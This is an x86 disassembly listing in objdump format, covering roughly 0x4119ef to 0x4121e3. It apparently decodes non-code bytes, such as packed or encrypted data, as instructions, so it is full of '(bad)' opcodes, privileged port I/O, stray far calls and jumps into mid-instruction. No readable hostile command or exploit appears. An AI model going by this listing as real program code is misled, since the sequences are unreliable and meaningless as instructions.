  4119ef:	jmp    0x413d7d
  4119f4:	popf   
  4119f5:	add    eax,0xa840804
  4119fa:	xchg   ecx,eax
  4119fb:	adc    bl,0x9b
  4119fe:	pop    eax
  4119ff:	in     al,dx
  411a00:	(bad)  
  411a01:	lea    cx,[edx+0xb]
  411a05:	mov    al,BYTE PTR [ebx-0x7ca1f37d]
  411a0b:	cmp    DWORD PTR [edi],0x8
  411a0e:	jne    0x411a4e
  411a10:	gs loope 0x4119ce
  411a13:	adc    edx,ecx
  411a15:	loope  0x4119c0
  411a17:	xchg   ecx,eax
  411a18:	inc    eax
  411a19:	popf   
  411a1a:	jo     0x411a77
  411a1c:	sub    bl,ah
  411a1e:	lods   al,BYTE PTR ds:[esi]
  411a1f:	std    
  411a20:	(bad)  
  411a22:	cmp    DWORD PTR [ebx+esi*1],ecx
  411a25:	push   ebx
  411a26:	pushf  
  411a27:	test   DWORD PTR [eax+0x71],ebp
  411a2a:	mov    edi,0x1c5dad49
  411a2f:	out    0xf4,eax
  411a31:	test   al,0xc6
  411a33:	push   edx
  411a34:	mov    BYTE PTR [esi-0x3daaae8a],bl
  411a3a:	push   0x72a7b4c3
  411a3f:	and    edx,DWORD PTR [edi]
  411a41:	sbb    eax,0x967684c2
  411a46:	popf   
  411a47:	fadd   DWORD PTR [eax+0x3a]
  411a4a:	push   ds
  411a4b:	outs   dx,BYTE PTR ds:[esi]
  411a4c:	or     al,0xdb
  411a4e:	ja     0x411a40
  411a50:	mov    cs,WORD PTR [esi-0x79]
  411a53:	aam    0x36
  411a55:	lods   al,BYTE PTR ds:[esi]
  411a56:	jb     0x411a90
  411a58:	(bad)  
  411a59:	into   
  411a5a:	js     0x4119f2
  411a5c:	jl     0x4119f1
  411a5e:	in     eax,dx
  411a5f:	cmp    eax,0x92b2f3da
  411a64:	pop    esi
  411a65:	popa   
  411a66:	inc    edx
  411a67:	dec    edx
  411a68:	pop    ds
  411a69:	pop    eax
  411a6a:	repnz dec ebp
  411a6c:	xchg   esp,edi
  411a6e:	jo     0x411aae
  411a70:	dec    eax
  411a71:	stc    
  411a72:	outs   dx,BYTE PTR ds:[esi]
  411a73:	push   ebp
  411a74:	add    edi,DWORD PTR [edx+0x61]
  411a77:	iret   
  411a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a79:	cmp    DWORD PTR [edx+eiz*4-0x405c22e],ecx
  411a80:	mov    al,0xc6
  411a82:	cld    
  411a83:	sti    
  411a84:	and    edx,eax
  411a86:	push   ds
  411a87:	push   0x43
  411a89:	dec    edx
  411a8a:	fld    DWORD PTR [ebx+0x32f58d60]
  411a90:	sub    eax,0xd4c90314
  411a95:	mov    al,0x5b
  411a97:	ror    DWORD PTR [edx],0xd
  411a9a:	adc    esp,eax
  411a9c:	and    BYTE PTR [eax-0x2d],dl
  411a9f:	test   BYTE PTR [ecx-0x52],bl
  411aa2:	fimul  WORD PTR [edx-0xd]
  411aa5:	imul   esi,DWORD PTR [ebx+edi*2+0x39689549],0x29
  411aad:	test   BYTE PTR fs:[esi+0x5d],bh
  411ab1:	and    bh,ch
  411ab3:	test   DWORD PTR [eax],esp
  411ab5:	ror    BYTE PTR [eax+ebp*4],0xa1
  411ab9:	inc    esp
  411aba:	mov    dh,0xe9
  411abc:	test   DWORD PTR [ecx+0x68],0x1aa270e0
  411ac3:	ins    DWORD PTR es:[edi],dx
  411ac4:	pop    ebx
  411ac5:	neg    BYTE PTR [esi+eiz*4+0xd16a5f8]
  411acc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411acd:	mov    dl,0x8
  411acf:	push   ebp
  411ad0:	cmp    eax,0xe0bfee7c
  411ad5:	sub    bl,ah
  411ad7:	(bad)  
  411ad8:	xor    esp,DWORD PTR [edi]
  411ada:	bound  ebx,QWORD PTR [edi+0x3]
  411add:	inc    edi
  411ade:	out    0xcd,al
  411ae0:	inc    si
  411ae2:	aad    0x41
  411ae4:	out    0xdd,al
  411ae6:	adc    ch,BYTE PTR [ebx]
  411ae8:	enter  0x8226,0x4e
  411aec:	mov    edx,fs
  411aee:	aaa    
  411aef:	sub    esi,DWORD PTR [esi+0x27382938]
  411af5:	loopne 0x411a8b
  411af7:	retf   
  411af8:	mov    edx,DWORD PTR ds:0x77757847
  411afe:	jnp    0x411b72
  411b00:	xchg   ecx,eax
  411b01:	push   ebx
  411b02:	cmp    DWORD PTR [ebx-0x7c8792dd],edx
  411b08:	mov    bl,0x26
  411b0a:	jmp    0x411b60
  411b0c:	inc    ecx
  411b0d:	pop    ebp
  411b0e:	fldcw  WORD PTR [esi-0x70]
  411b11:	outs   dx,DWORD PTR ds:[esi]
  411b12:	mov    al,ds:0xd052afac
  411b17:	sahf   
  411b18:	into   
  411b19:	and    eax,0x95b15fb4
  411b1e:	rcl    DWORD PTR [eax-0x56812dd8],cl
  411b24:	lods   al,BYTE PTR ds:[esi]
  411b25:	lods   al,BYTE PTR ds:[esi]
  411b26:	xor    ecx,DWORD PTR [edi-0x55ab8ec1]
  411b2c:	fmul   QWORD PTR [edx]
  411b2e:	in     al,dx
  411b2f:	pop    ds
  411b30:	stc    
  411b31:	add    eax,0x7c8373c5
  411b36:	dec    ecx
  411b37:	bound  ecx,QWORD PTR [ebp+0x3f]
  411b3a:	call   0x807f97e0
  411b3f:	ins    BYTE PTR es:[edi],dx
  411b40:	pop    es
  411b41:	and    DWORD PTR [ecx],edi
  411b43:	stos   BYTE PTR es:[edi],al
  411b44:	sub    dh,BYTE PTR [edi]
  411b46:	out    dx,al
  411b47:	jb     0x411b2e
  411b49:	jns    0x411b7c
  411b4b:	mov    bh,0x26
  411b4d:	adc    DWORD PTR [edi+eiz*1-0x42],edx
  411b51:	xor    bh,BYTE PTR [edi+0xf]
  411b54:	cmp    bh,BYTE PTR [edi+ecx*8+0x16]
  411b58:	sub    al,0x73
  411b5a:	sar    ebp,cl
  411b5c:	push   edi
  411b5d:	fist   WORD PTR [edx+0x71]
  411b60:	fs sbb al,0x32
  411b63:	pusha  
  411b64:	push   0x26
  411b66:	retf   0xf274
  411b69:	int3   
  411b6a:	ja     0x411af0
  411b6c:	fidivr WORD PTR [eax+0x39379678]
  411b72:	pushf  
  411b73:	test   DWORD PTR [ecx+0x719ce1cc],esp
  411b79:	pop    ebp
  411b7a:	fnstenv [ebx+0x6]
  411b7d:	jge    0x411ba6
  411b7f:	add    DWORD PTR [edx+0x1ee40cc],ebx
  411b85:	add    DWORD PTR [esi-0x5cff0782],esp
  411b8b:	popf   
  411b8c:	hlt    
  411b8d:	fs pop ecx
  411b8f:	pop    ebx
  411b90:	mov    ds:0xc7c75a4b,eax
  411b95:	xchg   esp,eax
  411b96:	fmul   QWORD PTR ds:0x2220f86d
  411b9c:	shr    DWORD PTR [esi+ecx*1-0x17250b83],0x14
  411ba4:	mov    ebp,0xe3d38e57
  411ba9:	stos   DWORD PTR es:[edi],eax
  411baa:	push   ds
  411bab:	les    esi,FWORD PTR [esi+0x30b88039]
  411bb1:	ret    0x1457
  411bb4:	xchg   DWORD PTR [ecx+0x7d],edx
  411bb7:	push   eax
  411bb8:	mov    ss:0xd20883b2,al
  411bbe:	sbb    al,0x6b
  411bc0:	repnz lahf 
  411bc2:	(bad)  
  411bc3:	in     eax,0x9d
  411bc5:	dec    ebp
  411bc6:	das    
  411bc7:	fnsave [edx]
  411bc9:	fs dec edx
  411bcb:	aam    0x4a
  411bcd:	test   edi,0x99451463
  411bd3:	add    ecx,0xffffffde
  411bd6:	xchg   esp,eax
  411bd7:	dec    eax
  411bd8:	push   0xffffffdb
  411bda:	cmp    eax,0x25c1397b
  411bdf:	jnp    0x411bc9
  411be1:	js     0x411c07
  411be3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411be4:	mul    al
  411be6:	out    0xc6,al
  411be8:	outs   dx,DWORD PTR ds:[esi]
  411be9:	mov    edi,0xa1ad4826
  411bee:	and    edx,ebx
  411bf0:	in     al,0xde
  411bf2:	mov    eax,DWORD PTR [edi]
  411bf4:	mov    edx,0x29ad66ba
  411bf9:	jmp    0x411bf4
  411bfb:	(bad)  
  411bfd:	call   0xda98:0x60dc21b5
  411c04:	cmp    eax,0x3fc73748
  411c09:	xchg   ecx,eax
  411c0a:	cmp    al,0x21
  411c0c:	repnz sub eax,0x6f37f8e4
  411c12:	pop    esi
  411c13:	jg     0x411c65
  411c15:	fs pusha 
  411c17:	inc    esi
  411c18:	arpl   dx,cx
  411c1a:	lock xor ecx,ebp
  411c1d:	push   ebx
  411c1e:	rol    DWORD PTR [esi+ebx*2],0x8
  411c22:	sub    al,0x29
  411c24:	inc    ebx
  411c25:	sub    DWORD PTR [ebx+0x41],ebx
  411c28:	inc    ebp
  411c29:	inc    ebp
  411c2a:	xor    BYTE PTR [edx-0x36],bh
  411c2d:	lahf   
  411c2e:	jo     0x411c26
  411c30:	push   ebp
  411c31:	cmp    BYTE PTR ds:0xe458783,cl
  411c37:	loopne 0x411c2e
  411c39:	iret   
  411c3a:	ror    DWORD PTR cs:[ebx+eiz*4+0x430dd3d3],cl
  411c42:	push   0x51ca93f1
  411c47:	xchg   esi,eax
  411c48:	shl    DWORD PTR [ebx+0x7],cl
  411c4b:	push   ebx
  411c4c:	jbe    0x411c50
  411c4e:	add    al,0x54
  411c50:	aad    0x2f
  411c52:	add    DWORD PTR [eax-0x3c],ebp
  411c55:	shl    al,cl
  411c57:	pop    esi
  411c58:	sbb    BYTE PTR [edi],cl
  411c5a:	jg     0x411ca0
  411c5c:	adc    BYTE PTR gs:0xf18787f,al
  411c63:	pushf  
  411c64:	iret   
  411c65:	leave  
  411c66:	(bad)  
  411c67:	pop    esi
  411c68:	push   ecx
  411c69:	push   ebp
  411c6a:	pushf  
  411c6b:	and    ebx,DWORD PTR [ebp-0x56]
  411c6e:	mov    esi,0xf1796128
  411c73:	aas    
  411c74:	pop    es
  411c75:	mov    esi,DWORD PTR [esi+0x5f]
  411c78:	push   edx
  411c79:	cld    
  411c7a:	cmp    bl,BYTE PTR [eax-0x55e2afeb]
  411c80:	out    0xfe,al
  411c82:	pop    edx
  411c83:	dec    ebp
  411c84:	popf   
  411c85:	fwait
  411c86:	aas    
  411c87:	mov    dl,0x9f
  411c89:	xchg   ebx,eax
  411c8a:	or     BYTE PTR [esi],cl
  411c8c:	mov    ebx,0xf9732185
  411c91:	mov    ebp,0x9d94a09f
  411c96:	jnp    0x411cd1
  411c98:	inc    ebx
  411c99:	jbe    0x411c2a
  411c9b:	ja     0x411c32
  411c9d:	ffree  st(1)
  411c9f:	sbb    BYTE PTR [esi+0x31],al
  411ca2:	(bad)  
  411ca3:	mov    WORD PTR [ebx-0x76],ds
  411ca6:	mov    ebp,0x57803c5c
  411cac:	or     eax,0x3517f8c5
  411cb1:	pop    ss
  411cb2:	xchg   esp,eax
  411cb3:	into   
  411cb4:	and    cl,BYTE PTR [edi]
  411cb6:	sbb    edx,ecx
  411cb8:	xchg   edi,eax
  411cb9:	popa   
  411cba:	sub    DWORD PTR [eax+edi*2+0x5d2ed9a],esi
  411cc1:	mov    ss,ecx
  411cc3:	push   0xffffff94
  411cc5:	mov    dh,0xc
  411cc7:	ss xor bh,al
  411cca:	mov    eax,0x6c96da3f
  411ccf:	ret    0xaf63
  411cd2:	pop    es
  411cd3:	dec    edx
  411cd4:	and    al,0x40
  411cd6:	and    eax,0x11a640f
  411cdb:	call   0x82c6b85c
  411ce0:	mov    eax,ds:0xd99ed815
  411ce5:	dec    esp
  411ce6:	std    
  411ce7:	jmp    0x4122:0xe95983ff
  411cee:	fidiv  WORD PTR [edi+0x4b9fc1e8]
  411cf4:	inc    esi
  411cf5:	or     al,0xcb
  411cf7:	or     eax,0xa4325d47
  411cfc:	outs   dx,BYTE PTR ds:[esi]
  411cfd:	nop
  411cfe:	and    DWORD PTR [eax+esi*2],esp
  411d01:	dec    esi
  411d02:	jno    0x411d70
  411d04:	popf   
  411d05:	pop    edx
  411d06:	jnp    0x411cc6
  411d08:	xor    DWORD PTR [ecx-0xda97cc9],edi
  411d0e:	in     al,0xd2
  411d10:	mov    edx,0x2f25cd43
  411d15:	retf   0xc978
  411d18:	mov    al,ds:0x87d91729
  411d1d:	push   edi
  411d1e:	push   esp
  411d1f:	or     eax,0xbc61bd64
  411d24:	jb     0x411d0f
  411d26:	popf   
  411d27:	mov    bh,0xb
  411d29:	push   edi
  411d2a:	imul   edi,DWORD PTR [edi-0x4300da92],0x2a
  411d31:	je     0x411d56
  411d33:	pop    eax
  411d34:	jae    0x411da4
  411d36:	add    eax,DWORD PTR ds:0x89f19414
  411d3c:	fsub   QWORD PTR [eax+0x176e6441]
  411d42:	scas   al,BYTE PTR es:[edi]
  411d43:	mov    al,0x31
  411d45:	ds sub edi,esp
  411d48:	sub    al,0xf
  411d4a:	das    
  411d4b:	xlat   BYTE PTR ds:[ebx]
  411d4c:	add    BYTE PTR [eax-0x6d],al
  411d4f:	mov    WORD PTR [ebp-0x201cef25],cs
  411d55:	xor    eax,0x6642ef31
  411d5a:	mov    edi,0xdf51cbd2
  411d5f:	in     eax,0xbd
  411d61:	inc    edx
  411d62:	mov    BYTE PTR [ecx-0x4edf0196],bl
  411d68:	addr16 cmp eax,0xa60a04f8
  411d6e:	xchg   ebx,eax
  411d6f:	sbb    DWORD PTR [ecx-0x6589714],eax
  411d75:	retf   
  411d76:	mov    ebp,0x913d9492
  411d7b:	and    edx,DWORD PTR [edi+0x1fb4c904]
  411d81:	add    DWORD PTR [ecx-0x4499c672],ebx
  411d87:	xchg   esi,eax
  411d88:	cmp    DWORD PTR [ebx+0x23],ebp
  411d8b:	shr    BYTE PTR [edi],0xf1
  411d8e:	xchg   esp,eax
  411d8f:	xchg   esi,eax
  411d90:	sar    BYTE PTR [esi+edx*2+0x654558cb],0xc9
  411d98:	stos   BYTE PTR es:[edi],al
  411d99:	shr    DWORD PTR [edx-0x7b],0xbf
  411d9d:	pop    ecx
  411d9e:	cmp    al,BYTE PTR gs:[eax+0x1314e039]
  411da5:	sub    DWORD PTR [eax+0x1b169113],ebp
  411dab:	cli    
  411dac:	push   eax
  411dad:	jge    0x411d46
  411daf:	add    eax,0xc5f6abda
  411db4:	sbb    dl,BYTE PTR [ecx-0x76]
  411db7:	mov    ch,0x8b
  411db9:	rcr    DWORD PTR ds:0x95879407,1
  411dbf:	pop    DWORD PTR [ebx+0x4d]
  411dc2:	xor    DWORD PTR [edi+0x5239c551],esp
  411dc8:	(bad)  
  411dc9:	retf   0x9c1c
  411dcc:	ret    
  411dcd:	push   cs
  411dce:	jmp    0x411dca
  411dd0:	scas   eax,DWORD PTR es:[edi]
  411dd1:	ja     0x411d93
  411dd3:	gs pop ds
  411dd5:	xchg   edi,eax
  411dd6:	or     edx,ebp
  411dd8:	es jg  0x411d72
  411ddb:	mov    BYTE PTR [ebx-0x769cfd51],al
  411de1:	retf   
  411de2:	sbb    eax,0x4a885f71
  411de7:	jo     0x411d93
  411de9:	fs cmc 
  411deb:	outs   dx,BYTE PTR ds:[esi]
  411dec:	inc    ecx
  411ded:	enter  0xb24,0xb2
  411df1:	mov    esi,0xc1957e76
  411df6:	or     eax,0x92e5619e
  411dfb:	push   0xfffffff7
  411dfd:	fs push ebx
  411dff:	push   esi
  411e00:	or     DWORD PTR [eax-0x2ef21c0f],0x7752bfe5
  411e0a:	sbb    BYTE PTR cs:[ebp+0x224272ee],0x4c
  411e12:	cdq    
  411e13:	ss push ss
  411e15:	adc    eax,0xe3db76a2
  411e1a:	pop    eax
  411e1b:	cmp    ch,BYTE PTR [ebp+0x6a6d6261]
  411e21:	mov    edx,DWORD PTR [esi-0x12]
  411e24:	rcl    bh,0x56
  411e27:	std    
  411e28:	(bad)  
  411e29:	jno    0x411ddc
  411e2b:	xchg   esi,eax
  411e2c:	xor    eax,0xdcec924f
  411e31:	outs   dx,BYTE PTR ds:[esi]
  411e32:	cmp    bl,BYTE PTR [ebp-0x5d4911ad]
  411e38:	push   edx
  411e39:	dec    edi
  411e3a:	push   0xffffffab
  411e3c:	int3   
  411e3d:	outs   dx,BYTE PTR ds:[esi]
  411e3e:	cs fdiv st(2),st
  411e41:	mov    eax,ds:0x47fbce9b
  411e46:	div    DWORD PTR [edx-0x52]
  411e49:	ja     0x411e86
  411e4b:	and    DWORD PTR [ecx+0x63bb30fa],edx
  411e51:	(bad)  
  411e52:	loope  0x411e67
  411e54:	mov    edx,0xeef46eb8
  411e59:	sbb    al,0xf
  411e5b:	jp     0x411e6b
  411e5d:	cdq    
  411e5e:	je     0x411e64
  411e60:	adc    al,0x56
  411e62:	xchg   edi,eax
  411e63:	shr    BYTE PTR [ecx],cl
  411e65:	repz pushf 
  411e67:	or     BYTE PTR [edi-0x3b],bl
  411e6a:	or     dh,bl
  411e6c:	add    esp,DWORD PTR [esi+0x57be3a1c]
  411e72:	push   ebx
  411e73:	lea    ecx,[ebp-0x1b]
  411e76:	pop    ss
  411e77:	ds (bad) 
  411e79:	pop    edx
  411e7a:	and    edi,DWORD PTR [edi+0x7b]
  411e7d:	adc    al,0x81
  411e7f:	mov    cl,0x3
  411e81:	or     al,0xb8
  411e83:	loop   0x411e07
  411e85:	pushf  
  411e86:	rcr    DWORD PTR [eax-0x24280cd7],1
  411e8c:	mov    dl,0x99
  411e8e:	int3   
  411e8f:	shl    dl,1
  411e91:	das    
  411e92:	add    al,0x2c
  411e94:	lds    edx,FWORD PTR [eax+0x63]
  411e97:	cld    
  411e98:	cmp    al,0x23
  411e9a:	xchg   esi,eax
  411e9b:	jae    0x411ea3
  411e9d:	inc    edx
  411e9e:	jo     0x411e55
  411ea0:	mov    cl,0x3b
  411ea2:	dec    ecx
  411ea3:	pop    edx
  411ea4:	cs xchg ecx,eax
  411ea6:	sahf   
  411ea7:	push   esi
  411ea8:	add    ebp,DWORD PTR ds:0xa11fcc19
  411eae:	mov    ds:0x7ebaad28,al
  411eb3:	sti    
  411eb4:	fdiv   QWORD PTR [ebp-0x1938b101]
  411eba:	outs   dx,BYTE PTR ds:[esi]
  411ebb:	mov    edi,0x7b3b5f57
  411ec0:	push   esi
  411ec1:	cmp    ah,BYTE PTR [eax]
  411ec3:	aam    0xc5
  411ec5:	pop    esi
  411ec6:	and    BYTE PTR [esi+0x7de19030],al
  411ecc:	and    al,0x97
  411ece:	in     al,0xa6
  411ed0:	inc    ebp
  411ed1:	adc    dl,ch
  411ed3:	mov    al,0x37
  411ed5:	dec    ecx
  411ed6:	(bad)  
  411ed7:	loop   0x411e80
  411ed9:	stos   BYTE PTR es:[edi],al
  411eda:	mov    edi,0x3878cb40
  411edf:	ds popa 
  411ee1:	test   al,0x68
  411ee3:	pop    ss
  411ee4:	xchg   edi,eax
  411ee5:	push   ebp
  411ee6:	outs   dx,BYTE PTR ds:[esi]
  411ee7:	adc    BYTE PTR [esi],bh
  411ee9:	dec    ecx
  411eea:	and    eax,ecx
  411eec:	lahf   
  411eed:	sub    al,0xcb
  411eef:	xor    al,dl
  411ef1:	inc    esp
  411ef2:	sbb    al,0xa3
  411ef4:	hlt    
  411ef5:	mov    dl,0xd1
  411ef7:	pop    eax
  411ef8:	aam    0xa
  411efa:	xor    DWORD PTR [edi-0x49],edi
  411efd:	mov    dh,0xf1
  411eff:	fs mov ch,al
  411f02:	fimul  DWORD PTR [edi+0x18]
  411f05:	xor    ecx,0x49
  411f08:	push   edi
  411f09:	mov    eax,ds:0xe53042a4
  411f0e:	push   cs
  411f0f:	lock repz mov bh,0x34
  411f13:	fisttp QWORD PTR [esp+edx*8-0x29a45e32]
  411f1a:	lahf   
  411f1b:	pop    esp
  411f1c:	aaa    
  411f1d:	mov    dl,al
  411f1f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f20:	lds    ecx,FWORD PTR [edi+0x6f7d5a4b]
  411f26:	and    al,0xfb
  411f28:	ret    0x6c3c
  411f2b:	sti    
  411f2c:	(bad)  
  411f2d:	aad    0x42
  411f2f:	stos   BYTE PTR es:[edi],al
  411f30:	xchg   BYTE PTR [eax],bh
  411f32:	ror    BYTE PTR [eax-0xb7cd5a0],0x25
  411f39:	push   ds
  411f3a:	sub    esi,DWORD PTR [ebx]
  411f3c:	shr    BYTE PTR [ebx],cl
  411f3e:	and    al,0xdc
  411f40:	sub    eax,0x6cf1d43a
  411f45:	in     al,dx
  411f46:	repnz fidivr WORD PTR [ebp+0x178ab59b]
  411f4d:	pop    ecx
  411f4e:	cmp    BYTE PTR ds:0xf9badb1e,ch
  411f54:	ret    0x6d6b
  411f57:	xor    al,al
  411f59:	xor    al,dl
  411f5b:	pop    ss
  411f5c:	jne    0x411f2d
  411f5e:	xchg   DWORD PTR [edx-0x1dac9097],ebp
  411f64:	cmp    bl,al
  411f66:	ret    
  411f67:	pop    edi
  411f68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411f69:	rcl    DWORD PTR [edi-0x5],0x8b
  411f6d:	xchg   ebp,eax
  411f6e:	(bad)  
  411f70:	ret    0x3306
  411f73:	mov    edi,0xfaece4e8
  411f78:	jecxz  0x411f11
  411f7a:	xchg   ebp,eax
  411f7b:	adc    edi,DWORD PTR [ebx+0x111d1d6]
  411f81:	xor    eax,0x5373dac4
  411f86:	dec    ebx
  411f87:	dec    ebx
  411f88:	xchg   esp,eax
  411f89:	add    DWORD PTR [edx-0x7cb6238c],0x47
  411f90:	inc    esi
  411f91:	repz mov edx,0x83ce81a0
  411f97:	aad    0xdd
  411f99:	cld    
  411f9a:	sub    bh,BYTE PTR [edx]
  411f9c:	mov    eax,0x6af13d35
  411fa1:	adc    eax,0xa2854363
  411fa6:	data16 (bad) 
  411fa8:	lods   eax,DWORD PTR ss:[esi]
  411faa:	cld    
  411fab:	jb     0x411fdd
  411fad:	or     al,0x49
  411faf:	mov    ch,0x25
  411fb1:	xor    eax,esi
  411fb3:	lds    esp,FWORD PTR [edi+0x22]
  411fb6:	loopne 0x412005
  411fb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411fb9:	lds    ebx,FWORD PTR [edx-0x42]
  411fbc:	sub    ch,BYTE PTR [ebx+0x3f]
  411fbf:	and    BYTE PTR [ecx+ebp*2-0x15c79fee],bl
  411fc6:	jmp    0xab7eab6e
  411fcb:	mov    bp,0xba5e
  411fcf:	fistp  WORD PTR [edx+ebx*8+0x3f301851]
  411fd6:	add    BYTE PTR [edx],dl
  411fd8:	cwde   
  411fd9:	cmp    BYTE PTR [ebx-0x5e],dh
  411fdc:	push   0x31ad5f75
  411fe1:	cwde   
  411fe2:	pop    ds
  411fe3:	sahf   
  411fe4:	jno    0x411f7e
  411fe6:	add    al,BYTE PTR [eax+0x13]
  411fe9:	sub    BYTE PTR [ecx+0x293dffe],al
  411fef:	rcl    DWORD PTR [edx-0x24577cfa],cl
  411ff5:	sbb    BYTE PTR [ebp+0x76e2a0a8],bh
  411ffb:	push   es
  411ffc:	jecxz  0x411ff9
  411ffe:	or     BYTE PTR [edx],0x84
  412001:	aam    0xd9
  412003:	fst    QWORD PTR [esi+0x59]
  412006:	je     0x411fc8
  412008:	(bad)  
  412009:	das    
  41200a:	jb     0x411ff1
  41200c:	fstp   QWORD PTR [esi+0x3e]
  41200f:	ret    0x78f5
  412012:	xor    BYTE PTR [esi],dl
  412014:	int3   
  412015:	jecxz  0x412026
  412017:	std    
  412018:	fmul   DWORD PTR [edx]
  41201a:	add    esp,ebp
  41201c:	iret   
  41201d:	popa   
  41201e:	adc    al,BYTE PTR [edi+0x65]
  412021:	jb     0x411fd0
  412023:	cs out dx,eax
  412025:	out    0xc7,al
  412027:	jnp    0x411fed
  412029:	hlt    
  41202a:	sti    
  41202b:	fimul  DWORD PTR [edx]
  41202d:	mov    al,ds:0x36dcec45
  412032:	cwde   
  412033:	call   0x6c6d85c8
  412038:	mov    ebp,0x8e8be3b8
  41203e:	xor    eax,0xe27b0f64
  412043:	sbb    DWORD PTR [ecx+eiz*8],edi
  412046:	mov    eax,0x5e80b023
  41204b:	iret   
  41204c:	and    BYTE PTR [ebx],al
  41204e:	scas   eax,DWORD PTR es:[edi]
  41204f:	neg    ch
  412051:	sbb    eax,DWORD PTR [edi-0x44]
  412054:	mov    dl,0xb9
  412056:	fwait
  412057:	jle    0x411fee
  412059:	add    DWORD PTR ds:[esi+esi*1+0x7b],edi
  41205e:	arpl   WORD PTR [ecx-0x5a],di
  412061:	push   esi
  412062:	dec    BYTE PTR [esi-0x7]
  412065:	mov    ebx,0xf893d7c8
  41206a:	ror    dh,cl
  41206c:	lahf   
  41206d:	call   0xadda:0x407b0fd6
  412074:	or     eax,DWORD PTR [ebx-0x33]
  412077:	mov    ebp,0xa6f86372
  41207c:	out    dx,eax
  41207d:	out    dx,al
  41207e:	ins    DWORD PTR es:[edi],dx
  41207f:	sti    
  412080:	test   eax,0x43f986fb
  412085:	inc    esi
  412086:	mov    dh,0x8e
  412088:	xor    DWORD PTR [ebx],0x4af5e659
  41208e:	jl     0x412042
  412090:	mov    ecx,0x16aed3bd
  412095:	and    ebx,edx
  412097:	adc    al,0x29
  412099:	add    BYTE PTR [edi+0x27],al
  41209c:	sti    
  41209d:	enter  0xf243,0x77
  4120a1:	aas    
  4120a2:	inc    eax
  4120a3:	fidivr WORD PTR [edi+0x56]
  4120a6:	push   edx
  4120a7:	and    dl,al
  4120a9:	cli    
  4120aa:	jb     0x41210a
  4120ac:	xor    eax,0x38e3deae
  4120b1:	push   esp
  4120b2:	pop    es
  4120b3:	push   esi
  4120b4:	mov    cl,0x50
  4120b6:	jne    0x4120e2
  4120b8:	sub    ah,BYTE PTR [esi]
  4120ba:	(bad)  
  4120bb:	repz pop esp
  4120bd:	repnz cld 
  4120bf:	add    DWORD PTR [edx+0x61be5376],edi
  4120c5:	inc    esp
  4120c6:	jg     0x4120db
  4120c8:	cs inc ebp
  4120ca:	pop    ecx
  4120cb:	or     ah,dl
  4120cd:	rol    ch,1
  4120cf:	cmp    edi,ebx
  4120d1:	lods   eax,DWORD PTR ds:[esi]
  4120d2:	fld    TBYTE PTR [ecx-0x51fe7e23]
  4120d8:	ss icebp 
  4120da:	ficomp DWORD PTR [edi+ebx*2+0x6eda2e8b]
  4120e1:	in     al,0x47
  4120e3:	aam    0x25
  4120e5:	xchg   ebx,eax
  4120e6:	mov    ds:0x71f56a56,eax
  4120eb:	xchg   esp,eax
  4120ec:	mov    ebx,0x8daa21be
  4120f1:	call   0x9642:0xdc3e0a13
  4120f8:	push   0x6d9603f3
  4120fd:	jb     0x412155
  4120ff:	mov    dl,0x7e
  412101:	mov    DWORD PTR [esp+eiz*2],ebx
  412104:	es sub al,0x3
  412107:	inc    edi
  412108:	pop    edx
  412109:	jne    0x412180
  41210b:	out    0xa8,al
  41210d:	jbe    0x41216f
  41210f:	or     al,BYTE PTR [ebp+0x1b55405c]
  412115:	fiadd  WORD PTR [edx]
  412117:	sbb    al,0x90
  412119:	push   esp
  41211a:	mov    gs,WORD PTR [edx]
  41211c:	push   0x1138959d
  412121:	mov    ds:0xc228759,al
  412126:	mov    bl,0x8c
  412128:	push   ebx
  412129:	iret   
  41212a:	test   BYTE PTR [eax],dh
  41212c:	sub    eax,0x11dfe842
  412131:	ret    
  412132:	ja     0x412166
  412134:	cmp    esi,DWORD PTR [ebp+eiz*1-0x6c]
  412138:	push   esi
  412139:	fs inc esi
  41213b:	dec    esp
  41213c:	and    al,0x36
  41213e:	jge    0x4121ab
  412140:	repnz clc 
  412142:	cs jae 0x4120c6
  412145:	fbld   TBYTE PTR [edi+ebp*1-0x68b6b60c]
  41214c:	out    0x82,al
  41214e:	das    
  41214f:	mov    eax,ds:0x9c05b1ff
  412154:	sbb    eax,0x8561aa57
  412159:	data16 out dx,al
  41215b:	mov    ebp,0xfaecbe13
  412160:	xchg   esi,eax
  412161:	mov    ds:0x95f79a5f,eax
  412166:	push   eax
  412167:	loop   0x412161
  412169:	rcr    esp,1
  41216b:	sub    al,0x54
  41216d:	stos   DWORD PTR es:[edi],eax
  41216e:	adc    ebp,DWORD PTR [edx+edi*8]
  412171:	jns    0x412134
  412173:	lds    edx,FWORD PTR [ebx-0x60]
  412176:	(bad)  
  412177:	adc    bh,BYTE PTR [ecx]
  412179:	and    ecx,DWORD PTR [esi+ecx*4+0x73]
  41217d:	es xchg esi,eax
  41217f:	(bad)  
  412180:	bnd jae 0x41218f
  412183:	or     ah,BYTE PTR [esi]
  412185:	jae    0x4121c6
  412187:	(bad)  
  412188:	fist   WORD PTR [edi-0x6e746a77]
  41218e:	inc    ebx
  41218f:	push   ds
  412190:	jne    0x4121d0
  412192:	imul   eax,eax,0x7ef8d101
  412198:	mov    ebp,0xd56af681
  41219d:	fwait
  41219e:	xchg   DWORD PTR [esi],eax
  4121a0:	icebp  
  4121a1:	xchg   edi,eax
  4121a2:	cmc    
  4121a3:	frstor [ecx]
  4121a5:	dec    DWORD PTR [ebx-0x40afcfe6]
  4121ab:	aas    
  4121ac:	fbld   TBYTE PTR [ecx-0x43]
  4121af:	mov    al,0x19
  4121b1:	fisubr WORD PTR [edi+ecx*4]
  4121b4:	add    ebp,eax
  4121b6:	in     eax,dx
  4121b7:	mov    ah,0xe0
  4121b9:	shl    DWORD PTR [edx*2-0xbd90b66],cl
  4121c0:	cmp    al,0x15
  4121c2:	sub    BYTE PTR [ecx+eiz*1+0x6b7d109e],ah
  4121c9:	jmp    ebp
  4121cb:	sub    eax,DWORD PTR [ecx+0x69]
  4121ce:	imul   BYTE PTR [edi-0xd10ceca]
  4121d4:	push   ebx
  4121d5:	push   0xf919162e
  4121da:	js     0x41216e
  4121dc:	in     al,0x16
  4121de:	ds push ss
  4121e0:	sub    DWORD PTR [edx-0x21],ebx
  4121e3:	jl     0x412192
